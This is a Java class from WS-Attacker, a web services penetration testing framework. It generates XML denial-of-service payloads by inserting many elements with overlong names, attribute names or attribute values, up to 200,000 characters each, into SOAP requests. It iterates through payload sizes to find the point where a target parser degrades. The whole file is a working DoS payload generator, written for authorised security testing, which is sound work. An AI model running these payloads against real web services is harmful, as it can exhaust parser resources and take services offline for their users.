/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import wsattacker.library.intelligentdos.common.DoSParam;
import wsattacker.library.intelligentdos.helper.IterateModel;

public class XmlOverlongNames
    extends AbstractDoSAttack
{
    private static final int MIN_NUMBER_OF_ELEMENTS = 1;

    private static final int MIN_LENGTH_OF_STRING = 1;

    private static final String NODEVALUE = "value";

    public static enum For
    {

        ElementName, AttributeName, AttributeValue
    }

    private final PayloadPosition[] possiblePossitions = { PayloadPosition.ELEMENT };

    private final For[] defaultOverlongFor = { For.ElementName, For.AttributeName, For.AttributeValue };

    private static final IterateModel defaultLengthOfStrings =
        IterateModel.custom().startAt( 12500 ).stopAt( 200000 ).setIncrement( 4 ).setIterateStrategie( IterateModel.IterateStrategie.MUL ).setIncreaseIncrementStrategie( IterateModel.IncreaseIncrementStrategie.NO ).build();

    private static final IterateModel defaultNumberOfElements =
        IterateModel.custom().startAt( 4 ).stopAt( 8 ).setIncrement( 4 ).setIterateStrategie( IterateModel.IterateStrategie.ADD ).setIncreaseIncrementStrategie( IterateModel.IncreaseIncrementStrategie.NO ).build();

    private For[] overlongFor;

    // iterator
    private IterateModel lengthOfStrings;

    private IterateModel numberOfElements;

    private Iterator<For> overlongForIterator;

    // current
    private int currentLengthOfString;

    private int currentNumberOfElements;

    private For currentFor;

    public XmlOverlongNames()
    {
        overlongFor = defaultOverlongFor;
        overlongForIterator = Arrays.asList( overlongFor ).iterator();

        try
        {
            lengthOfStrings = defaultLengthOfStrings.clone();
            numberOfElements = defaultNumberOfElements.clone();
        }
        catch ( CloneNotSupportedException e )
        {
            // may not happen
        }

    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getName()
     */
    @Override
    public String getName()
    {
        return "XmlOverlongNames";
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getPossiblePossitions()
     */
    @Override
    public PayloadPosition[] getPossiblePossitions()
    {
        PayloadPosition[] copy = new PayloadPosition[possiblePossitions.length];
        System.arraycopy( possiblePossitions, 0, copy, 0, possiblePossitions.length );
        return copy;
    }

    public For[] getOverlongNamesFor()
    {
        For[] copy = new For[overlongFor.length];
        System.arraycopy( overlongFor, 0, copy, 0, overlongFor.length );
        return copy;
    }

    public void setOverlongNamesFor( For[] overlongFor )
    {
        if ( overlongFor == null || overlongFor.length == 0 )
        {
            throw new IllegalArgumentException( "elements may not be null" );
        }

        this.overlongFor = new For[overlongFor.length];
        System.arraycopy( overlongFor, 0, this.overlongFor, 0, overlongFor.length );
        this.overlongForIterator = Arrays.asList( overlongFor ).iterator();
    }

    public IterateModel getLengthOfStringsIterator()
    {
        try
        {
            return lengthOfStrings.clone();
        }
        catch ( CloneNotSupportedException ex )
        {
            Logger.getLogger( XmlElementCount.class.getName() ).log( Level.SEVERE, null, ex );
        }
        return null;
    }

    public void setLengthOfStringsIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "NumberOfElementsIterator may not be null" );
        }

        lengthOfStrings = iterateModel;
    }

    public IterateModel getNumberOfElementsIterator()
    {
        try
        {
            return numberOfElements.clone();
        }
        catch ( CloneNotSupportedException ex )
        {
            Logger.getLogger( XmlElementCount.class.getName() ).log( Level.SEVERE, null, ex );
        }
        return null;
    }

    public void setNumberOfElementsIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "NumberOfElementsIterator may not be null" );
        }

        numberOfElements = iterateModel;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#hasFurtherParams()
     */
    @Override
    public boolean hasFurtherParams()
    {
        return lengthOfStrings.hasNext() || numberOfElements.hasNext() || overlongForIterator.hasNext();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#nextParam()
     */
    @Override
    public void nextParam()
    {
        if ( !initialized )
        {
            currentLengthOfString = lengthOfStrings.next();
            currentNumberOfElements = numberOfElements.next();
            currentFor = overlongForIterator.next();

            initialized = true;
        }
        else if ( lengthOfStrings.hasNext() )
        {
            currentLengthOfString = lengthOfStrings.next();
        }
        else if ( numberOfElements.hasNext() )
        {
            lengthOfStrings.reset();
            currentLengthOfString = lengthOfStrings.next();

            currentNumberOfElements = numberOfElements.next();
        }
        else if ( overlongForIterator.hasNext() )
        {
            lengthOfStrings.reset();
            currentLengthOfString = lengthOfStrings.next();

            numberOfElements.reset();
            currentNumberOfElements = numberOfElements.next();

            currentFor = overlongForIterator.next();
        }
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getCurrentParams()
     */
    @Override
    public List<DoSParam<?>> getCurrentParams()
    {
        List<DoSParam<?>> list = new ArrayList<DoSParam<?>>();
        list.add( new DoSParam<Integer>( "Length of the String", currentLengthOfString ) );
        list.add( new DoSParam<Integer>( "Number of Elements", currentNumberOfElements ) );
        list.add( new DoSParam<For>( "Overlong Attack for", currentFor ) );

        return list;
    }

    /*
     * (non-Javadoc)
     * @see
     * wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getCommentLength(wsattacker.library.intelligentdos.dos
     * .DoSAttack.PayloadPosition)
     */
    @Override
    int getCommentLength( PayloadPosition payloadPosition )
    {
        int length = 0;

        int lengthNamespace = 0;
        if ( useNamespace )
        {
            lengthNamespace = namespace.length();
        }

        switch ( currentFor )
        {
            case ElementName:
                length = currentNumberOfElements * 2 * ( currentLengthOfString + 5 );
                break;
            case AttributeName:
            case AttributeValue:
                // <attackElement ="test">value</attackElement>
                length = currentNumberOfElements * ( lengthNamespace + 44 + currentLengthOfString );
                break;
            default:
        }

        return length;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getTamperedRequest(java.lang.String,
     * wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition)
     */
    @Override
    public String getTamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        String nodeValue = NODEVALUE;

        StringBuilder sb = new StringBuilder( "" );

        switch ( currentFor )
        {
            case ElementName:
                for ( int i = 0; i < currentNumberOfElements; i++ )
                {
                    sb.append( "<" );
                    for ( int j = 0; j < ( currentLengthOfString ); j++ )
                    {
                        sb.append( "A" );
                    }
                    sb.append( ">" ).append( nodeValue ).append( "</" );
                    for ( int j = 0; j < ( currentLengthOfString ); j++ )
                    {
                        sb.append( "A" );
                    }
                    sb.append( ">" );
                }
                break;
            case AttributeName:
                for ( int i = 0; i < currentNumberOfElements; i++ )
                {
                    sb.append( "<attackElement " );

                    if ( useNamespace )
                    {
                        sb.append( namespace );
                    }

                    for ( int j = 0; j < ( currentLengthOfString ); j++ )
                    {
                        sb.append( "B" );
                    }
                    sb.append( "=\"test\">" ).append( nodeValue ).append( "</attackElement>" );
                }
                break;
            case AttributeValue:
                for ( int i = 0; i < currentNumberOfElements; i++ )
                {
                    sb.append( "<attackElement " );

                    if ( useNamespace )
                    {
                        sb.append( namespace );
                    }

                    sb.append( "long=\"" );
                    for ( int j = 0; j < ( currentLengthOfString ); j++ )
                    {
                        sb.append( "C" );
                    }
                    sb.append( "\">" ).append( nodeValue ).append( "</attackElement>" );
                }

                break;

            default:
                break;
        }

        return payloadPosition.replacePlaceholder( xml, sb.toString() );
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#minimal()
     */
    @Override
    public DoSAttack minimal()
    {
        XmlOverlongNames xmlOverlongNames = new XmlOverlongNames();
        xmlOverlongNames.currentFor = this.currentFor;
        xmlOverlongNames.currentLengthOfString = MIN_LENGTH_OF_STRING;
        xmlOverlongNames.currentNumberOfElements = MIN_NUMBER_OF_ELEMENTS;

        return xmlOverlongNames;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#middle(wsattacker.library.intelligentdos.dos.DoSAttack)
     */
    @Override
    public DoSAttack middle( DoSAttack aThat )
    {
        if ( this == aThat )
        {
            XmlOverlongNames xmlOverlongNames = new XmlOverlongNames();
            xmlOverlongNames.currentFor = this.currentFor;
            xmlOverlongNames.currentLengthOfString = this.currentLengthOfString;
            xmlOverlongNames.currentNumberOfElements = this.currentNumberOfElements;
            return xmlOverlongNames;
        }

        if ( !aThat.getClass().equals( getClass() ) || !( aThat instanceof XmlOverlongNames ) )
        {
            throw new IllegalArgumentException( aThat.getClass() + " is not allowed!" );
        }

        XmlOverlongNames that = (XmlOverlongNames) aThat;

        XmlOverlongNames xmlOverlongNames = new XmlOverlongNames();
        xmlOverlongNames.currentFor = this.currentFor;

        if ( this.currentLengthOfString == that.currentLengthOfString
            && this.currentNumberOfElements == that.currentNumberOfElements )
        {
            xmlOverlongNames.currentLengthOfString = this.currentLengthOfString;
            xmlOverlongNames.currentNumberOfElements = this.currentNumberOfElements;
        }
        else if ( this.currentLengthOfString == that.currentLengthOfString )
        {
            xmlOverlongNames.currentLengthOfString = this.currentLengthOfString;
            xmlOverlongNames.currentNumberOfElements =
                calculateMiddle( this.currentNumberOfElements, that.currentNumberOfElements );
        }
        else if ( this.currentNumberOfElements == that.currentNumberOfElements )
        {
            xmlOverlongNames.currentNumberOfElements = this.currentNumberOfElements;
            xmlOverlongNames.currentLengthOfString =
                calculateMiddle( this.currentLengthOfString, that.currentLengthOfString );
        }
        else
        {
            xmlOverlongNames.currentLengthOfString =
                calculateMiddle( this.currentLengthOfString, that.currentLengthOfString );
            xmlOverlongNames.currentNumberOfElements =
                calculateMiddle( this.currentNumberOfElements, that.currentNumberOfElements );
        }

        return xmlOverlongNames;
    }

    @Override
    public void initialize()
    {
        super.initialize();

        lengthOfStrings.reset();
        numberOfElements.reset();
        overlongForIterator = Arrays.asList( overlongFor ).iterator();
    }

    /*
     * @see http://findbugs.sourceforge.net/bugDescriptions.html#HE_EQUALS_USE_HASHCODE (non-Javadoc)
     * @see java.lang.Object#hashCode()
     */
    @Override
    public int hashCode()
    {
        assert false : "hashCode not designed";
        return 42; // any arbitrary constant will do
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.AbstractDoSAttack#equals(java.lang.Object)
     */
    @Override
    public boolean equals( Object obj )
    {
        if ( obj == null )
            return false;

        if ( obj == this )
            return true;

        if ( !obj.getClass().equals( getClass() ) )
            return false;

        XmlOverlongNames that = (XmlOverlongNames) obj;

        List<DoSParam<?>> paramThis = this.getCurrentParams();
        List<DoSParam<?>> paramThat = that.getCurrentParams();

        DoSParam<?> forThis = paramThis.get( 2 );
        DoSParam<?> forThat = paramThat.get( 2 );

        return forThis.getValueAsString().equals( forThat.getValueAsString() );
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Comparable#compareTo(java.lang.Object)
     */
    @Override
    public int compareTo( DoSAttack aThat )
    {
        // this optimization is usually worthwhile, and can
        // always be added
        if ( this == aThat )
            return EQUAL;

        if ( !aThat.getClass().equals( getClass() ) )
        {
            return EQUAL;
        }

        XmlOverlongNames that = (XmlOverlongNames) aThat;

        if ( this.currentNumberOfElements < that.currentNumberOfElements )
            return BEFORE;
        if ( this.currentNumberOfElements > that.currentNumberOfElements )
            return AFTER;

        if ( this.currentLengthOfString < that.currentLengthOfString )
            return BEFORE;
        if ( this.currentLengthOfString > that.currentLengthOfString )
            return AFTER;

        return EQUAL;
    }

    public static void main( String[] args )
    {
    }

}
